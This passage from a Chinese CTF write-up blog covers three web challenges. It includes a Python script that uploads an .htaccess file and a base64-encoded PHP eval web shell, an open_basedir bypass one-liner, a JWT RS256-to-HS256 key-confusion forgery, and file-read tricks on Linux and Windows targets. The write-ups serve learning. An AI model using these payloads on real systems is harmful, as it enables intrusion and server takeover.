    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以先看一下PHP版本，7+所以过滤&lt;?之后&lt;script&gt;这种方法就绕不过去了，并且过滤了ph的后缀，利用htaccess绕过<br>需要手搓代码上传文件，知识盲区，网上抄了一个现成脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64

url <span class="token operator">=</span> <span class="token string">"http://b11cd486-9833-4bef-bf24-967205c05ada.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();"</span> \
      <span class="token string">"&amp;%fe=get_the_flag"</span>


htaccess <span class="token operator">=</span> b<span class="token triple-quoted-string string">"""#define width 1 
#define height 1 
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"

"""</span>
<span class="token comment" spellcheck="true"># 把.cc解析为PHP，并且将上传的shell添加到末尾，base64编码绕过检测</span>

shell <span class="token operator">=</span> b<span class="token string">"\x00\x00\x8a\x39\x8a\x39"</span><span class="token operator">+</span>b<span class="token string">"00"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"&lt;?php eval($_GET['c'];);?>"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'>eval($_REQUEST[c];);&lt;/script>"</span>
<span class="token comment" spellcheck="true"># 玄妙的字符可以绕过exif_imagetype，补的00用来base64解码，否则解码可能无法还原后面shell部分。字符串前面的b表示字符串为byte类型，为网络数据传输需要格式</span>

files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>


files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'shell.cc'</span><span class="token punctuation">,</span> shell<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p>open_basedir绕过<br>这个shell打上去之后就基本为所欲为，但是看phpinfo可以看到一个open_basedir的限制，直接用chdir加ini_set绕过<code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题看记录是去年十月底左右开始写的，之后十一月份就开始忙srtp？还是期末？寒假浑浑噩噩到现在才开始继续学习，今天算是把之前欠下的补回来，总的来说，没好好学习呜呜呜，最近加油吧，时隔三个多月完全没看题，现在的我又是一个零基础菜逼了</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/5677">https://xz.aliyun.com/t/5677</a><br><a href="https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/">https://www.smi1e.top/%E5%9B%BD%E8%B5%9Blove_math%E9%A2%98%E8%A7%A3/</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>[UnionCTF2021]Cr0wnAir</title>
    <url>/%5BUnionCTF2021%5DCr0wnAir.html</url>
    <content><![CDATA[<h1 id="UnionCTF2021-Cr0wnAir"><a href="#UnionCTF2021-Cr0wnAir" class="headerlink" title="[UnionCTF2021]Cr0wnAir"></a>[UnionCTF2021]Cr0wnAir</h1><p>最近天天被外国比赛暴打。。。。这次UnionCTF两个web，一个sqlite的union注入，零过滤，百度的payload都能打通，还有就是这个题，还蛮有意思的，后面这步利用感觉还比较实用，学习了</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>贴一部分</p>
<pre class=" language-javascript"><code class="language-javascript">checkin<span class="token punctuation">.</span>js
<span class="token keyword">const</span> pattern <span class="token operator">=</span> <span class="token punctuation">{</span>
  firstName<span class="token punctuation">:</span> <span class="token regex">/^\w{1,30}$/</span><span class="token punctuation">,</span>
  lastName<span class="token punctuation">:</span> <span class="token regex">/^\w{1,30}$/</span><span class="token punctuation">,</span>
  passport<span class="token punctuation">:</span> <span class="token regex">/^[0-9]{9}$/</span><span class="token punctuation">,</span>
  ffp<span class="token punctuation">:</span> <span class="token regex">/^(|CA[0-9]{8})$/</span><span class="token punctuation">,</span>
  extras<span class="token punctuation">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>sssr<span class="token punctuation">:</span> <span class="token regex">/^(BULK|UMNR|VGML)$/</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">isSpecialCustomer</span><span class="token punctuation">(</span>passport<span class="token punctuation">,</span> frequentFlyerNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">createToken</span><span class="token punctuation">(</span>passport<span class="token punctuation">,</span> frequentFlyerNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> status <span class="token operator">=</span> <span class="token function">isSpecialCustomer</span><span class="token punctuation">(</span>passport<span class="token punctuation">,</span> frequentFlyerNumber<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"gold"</span> <span class="token punctuation">:</span> <span class="token string">"bronze"</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"status"</span><span class="token punctuation">:</span> status<span class="token punctuation">,</span> <span class="token string">"ffp"</span><span class="token punctuation">:</span> frequentFlyerNumber<span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> config<span class="token punctuation">.</span>privkey<span class="token punctuation">,</span> <span class="token string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>jpv<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> pattern<span class="token punctuation">,</span> <span class="token punctuation">{</span> debug<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> mode<span class="token punctuation">:</span> <span class="token string">"strict"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"firstName"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Tony"</span> <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">[</span><span class="token string">"lastName"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Abbott"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token punctuation">{</span>msg<span class="token punctuation">:</span> <span class="token string">"You have successfully checked in! Please remember not to post your boarding pass on social media."</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"ffp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token punctuation">{</span>msg<span class="token punctuation">:</span> <span class="token string">"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer."</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span>e <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">"extras"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"extras"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"sssr"</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">[</span><span class="token string">"extras"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"sssr"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">"FQTU"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token function">createToken</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"passport"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">"ffp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token punctuation">{</span>msg<span class="token punctuation">:</span> <span class="token string">"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal."</span><span class="token punctuation">,</span> <span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
</code></pre>
<p>简而言之，就是用了一个jpv库进行正则匹配，如果提交的数据能过匹配然后就根据情况回显，如果extras下的sssr属性有一项为FQTU就签一个RS256的青铜票据下来，但是显然之前的正则是不允许提交这么个FQTU的</p>
<p>获取了token之后就可以去upgrades路由换flag，如下</p>
<pre class=" language-javascript"><code class="language-javascript">upgrades<span class="token punctuation">.</span>js
<span class="token keyword">function</span> <span class="token function">getLoyaltyStatus</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>authorization<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> token <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>authorization<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> config<span class="token punctuation">.</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> msg<span class="token punctuation">:</span> <span class="token string">'Token is not valid.'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>token <span class="token operator">=</span> decoded<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>getLoyaltyStatus<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>token <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>token<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token string">"gold"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token punctuation">{</span>msg<span class="token punctuation">:</span> config<span class="token punctuation">.</span>flag <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token punctuation">{</span>msg<span class="token punctuation">:</span> <span class="token string">"You do not qualify for this upgrade at this time. Please fly with us more."</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>解码jwt查看票据类型，黄金票据就给flag，使用npm aduit可以看到这个jwt的版本较老，存在一个严重的漏洞，即jwt.decode未指定算法时，可以通过jwt中携带的算法进行验证</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>可以很清楚的看出来解题思路，1.绕过正则获取一个青铜票据，2.通过某种方法从签发的token中还原出公钥，然后将jwt验证算法更改为对称算法HS256，则可以直接用公钥对称加解密完成cookie伪造</p>
<h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>jpv查了一下是一个比较小众的库，直接在GitHub上就能看到一个似乎有用的issue<br><a href="https://github.com/manvel-khnkoyan/jpv/issues/6">A vulnerability in validate()</a><br>jpv的版本也较老，符合利用要求，该版本之前jpv在比较时有如下语句</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> pattern <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> pattern <span class="token operator">!==</span> <span class="token keyword">typeof</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
         <span class="token keyword">return</span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> 
     <span class="token punctuation">}</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>pattern <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> value <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
         <span class="token keyword">return</span> <span class="token function">res</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>name <span class="token operator">===</span> pattern<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>name<span class="token punctuation">)</span> 
     <span class="token punctuation">}</span> 
     <span class="token keyword">return</span> <span class="token function">res</span><span class="token punctuation">(</span>value <span class="token operator">===</span> pattern<span class="token punctuation">)</span> 
 <span class="token punctuation">}</span> 
</code></pre>
<p>当模式是一个对象，且双方均不为null时，将返回value的constructor属性的name和模式的对比的结果，因此构造如下一个对象，就能进行欺骗进行绕过</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> user_input <span class="token operator">=</span> <span class="token punctuation">{</span>
    should_be_arrary<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Array'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> pattern <span class="token operator">=</span> <span class="token punctuation">{</span>
    should_be_arrary<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>但是这里有一个很奇怪的地方，jpv验证使用了<code>mode: &quot;strict&quot;</code>这个模式只允许值与模式的数据完全一致，不允许存在多的键值对，应该额外构造出来的属性是不能过这个strict条件的？</p>
<h3 id="公钥还原"><a href="#公钥还原" class="headerlink" title="公钥还原"></a>公钥还原</h3><p>说实话这步真超出认知范围<br>我一开始想的就是暴力破解。。。但是直接遍历硬跑肯定没机会，数学不好的我一度认为可能能构造一对密钥使得公钥很短私钥很长。。。。能让我暴力破解<br>然后老国王告诉我这个RSA1024的公私钥都至尊长，直接放弃，不过很令人吃惊的是无敌的非对称加密算法居然允许从密文中推导出公钥！</p>
<blockquote>
<p>At this point it’s important to remember that although public key cryptosystems guarantee that the private key can’t be derived from the public key, signatures, ciphertexts, etc., there are usually no such guarantees for the public key! </p>
</blockquote>
<p>分解公因数什么的进行超级爆破，数学不好的我已经不太记得清是怎么回事了。。。<br>但是工具拿来能用就行，只要两个私钥签的jwt就能推导出公钥，本地爆破了一下十分钟左右就出了（工具在用的时候cryptography版本不一样，有个函数位置变了，需要自己改一下才能用）</p>
<p>用公钥签一个新的cookie，签一个黄金票据，算法改为对称算法HS256，获得flag</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/">ABUSING JWT PUBLIC KEYS WITHOUT THE PUBLIC KEY</a><br><a href="https://ctftime.org/writeup/26047">Cr0wnAir wp</a><br><a href="https://github.com/silentsignal/rsa_sign2n/tree/release/CVE-2017-11424">工具</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>jwt</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>[TCTF2021 final]复现</title>
    <url>/%5BTCTF2021%20final%5D%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="TCTF2021-final-复现"><a href="#TCTF2021-final-复现" class="headerlink" title="[TCTF2021 final]复现"></a>[TCTF2021 final]复现</h1><p>作为垃圾选手在TCTF qual中被暴打，居然还能被邀请参加决赛，谢谢腾讯给我一个机会，被打的很惨，有机会的话明年还想来挨打。web一题没出，完全不会，赛后环境也急速关闭跑路了，只能根据附件和wp进行复现尝试</p>
<h2 id="eeeenginx"><a href="#eeeenginx" class="headerlink" title="eeeenginx"></a>eeeenginx</h2><p>唯一做出来的一个题，还是个misc。。。<br>给了一个nginx搭建的服务，有一个任意文件下载。<br>乱翻是翻不到东西的，尝试读cmdline，读&#x2F;proc&#x2F;self&#x2F;cmdline只读到是nginx的work进程，没用。再次复习老国王的读proc之术<br>先读<code>/sys/fs/cgroup/systemd/tasks</code>，能拿到所有的进程号，就能用<code>/proc/pid/cmdline</code>来看有什么内容了，看了一下，一号进程是nginx主进程，剩下的全是子进程，但是主进程中的cmdline是这样的</p>
<pre><code>nginx: master process
/usr/local/openresty/nginx/sbin/nginx -p /work/ -c conf/nginx.conf -g daemon off;
</code></pre>
<p>没用仔细研究过nginx命令行，但是这个work看起来就很像是工作目录之类的东西，直接读<code>/work/conf/nginx.conf</code>拿到配置文件。然后配置文件里写功能是lua脚本实现的，读lua脚本，也读不到什么东西，就是个正常的输入文件名，然后返回对应文件，搜了搜对应函数和功能，似乎也没有什么漏洞。<br>读了一波error.log，想从之前做出来的人手中获得些什么，没翻到什么有用的，老国王直接从哪翻出来了整个access.log。。。error log是直接配置在了当前目录下的log&#x2F;error.log下的，不知道access.log是在哪，当时没试现在环境没了，<code>/usr/local/nginx/logs/access.log</code>？还是也就在log下？或者<code>/usr/local/openresty/nginx/logs/access.log</code>?<br>然后我们翻着翻着，翻到了有意思的东西<br>突然出现了一句<code>/opt/module/ngx_http_eeenginx.c</code>一个nginx扩展模块？（我现在都不知道是从哪找到的nginx的扩展模块配置）读下来发现里面直接有一个shell功能，直接执行readflag，在提交的某个cookie为特定值时触发。有意思的是那个文件里还附带了这个恶意模块的作者。。。去GitHub上还真能搜到，并且仓库里的代码就和题目的别无二致，因为命令执行时是直接把标准输入输出给连到当前会话上了，所以要nc上去通信，因此作者还自己写了个客户端。。。用python发包也行，也能拿到错误信息，就是flag，而burp就因为收到的不是http包啥都不显示。<br><a href="https://github.com/t57root/pwnginx">pwnginx</a></p>
<h2 id="win-win"><a href="#win-win" class="headerlink" title="win-win"></a>win-win</h2><p>恐怕是唯一一个能被我理解的题目了。。。代码至善至美，又是经典1 line php（其实有三行），代码大概就是这个样子<br><code>&lt;?php highlight_file(__FILE__);readfile($_GET[&#39;win&#39;]);include __DIR__.$_GET[&#39;win&#39;];</code></p>
<p>给了一个白的无过滤include，hint中说关了upload progress。<br>先用新学的pearcmd打一波。无反应，那就读一个&#x2F;etc&#x2F;passwd，读不到。试了半天只能读index.php，没有phpinfo，我一度怀疑上了个无敌的open basedir。试了试远程读取，应该开了allow url fopen，拼了目录，就算开了allow url include也没用，并且如果开了无敌的open basedir的话，没法打，于是乱按按出来了一个404报错，给我来了一句<code>Apache(Win32)</code>(还是win64来着，记不清了)，还附带了一个openssl版本，看起来不是一般的Apache，起码告诉我这是一个windows机器了。。<br>那么windows读什么？windows下&#x2F;etc&#x2F;passwd的等效替代品是C:&#x2F;windows&#x2F;win.ini，读到这个文件先确认任意文件读</p>
<p>然后不会了，试着去猜了猜php.ini和httd.conf的路径，都猜不到，那就不知道接下来怎么打了</p>
<h3 id="wp环节"><a href="#wp环节" class="headerlink" title="wp环节"></a>wp环节</h3><p>似乎还有很多解，不过都深入到了winapi这种超级底层，以及一个非常关键的windows下文件名通配符<br>这个东西我以前还写过。。。但是完全没记住呢，赛后rmb神仙和我提起我才想起来。。。又进行了额外的测试</p>
<h3 id="ROIS解"><a href="#ROIS解" class="headerlink" title="ROIS解"></a>ROIS解</h3><p>ROIS用的是<code>\\.\C:</code>这样子的一个方式,windows下的特殊规则<code>\\.\X:</code>可以访问到X这个盘符，据他们所言这个操作能拿到整个C盘（那不是有几十个G？）然后他们就拿到了PHP上传文件时的默认路径，然后使用了windows下的文件通配符，直接包含文件上传时PHP产生的临时文件<br>这个方法我稍微试验了一下，访问这个C盘需要对C盘下所有文件夹及文件拥有权限，也就是得开administrator这个号，所以一般情况下这个方式也并不实用</p>
<h3 id="NeSE解"><a href="#NeSE解" class="headerlink" title="NeSE解"></a>NeSE解</h3><p>类似，但是听起来更预期一些，我在比赛的时候就用相对目录确认了index.php是在<code>C:/xxx/index.php</code>目录下的，因为跳一层目录后可以读到win.ini。<br>但是那个时候没想起来可以利用windows文件通配符进行目录猜解，这里只有一层目录未知，是可以猜解出来路径名为<code>C:/htdocs/index.php</code>，不过我估计我猜解出这个目录也没什么用。。。并且据说神仙直接从404的报错中就猜出来了这个服务是用XAMPP安装的（我完全不知道怎么看出来的，就因为报错里多了个openssl的版本吗）<br>总之，htdocs是XAMPP安装时web根目录的名字，但是这里他改了httpd.conf，所以根目录的位置变了，但是安装一个XAMPP的话能知道里面的文件名和路径都是固定的，可以以此来爆破XAMPP的安装路径（当然需要安装路径也只有一个深度），获取到XAMPP路径后php.ini，Apache配置文件各种东西随便读，当然也是读到PHP放上传文件的临时目录，再用通配符进行匹配包含</p>
<p>顺便记一下可以看的一些乱七八糟文件<br><code>C:\Windows\debug\NetSetup.log</code><br><code>C:\Windows\Logs\DISM\dism.log</code></p>
<h3 id="Nu1l解"><a href="#Nu1l解" class="headerlink" title="Nu1l解"></a>Nu1l解</h3><p>不知道是什么，听说是webdav整出readfile缓存？<br>不会，但是找到了一个新玩具，procmon，可以监控文件系统之类的，下次玩一下<br>先咕，想起来了再复现</p>
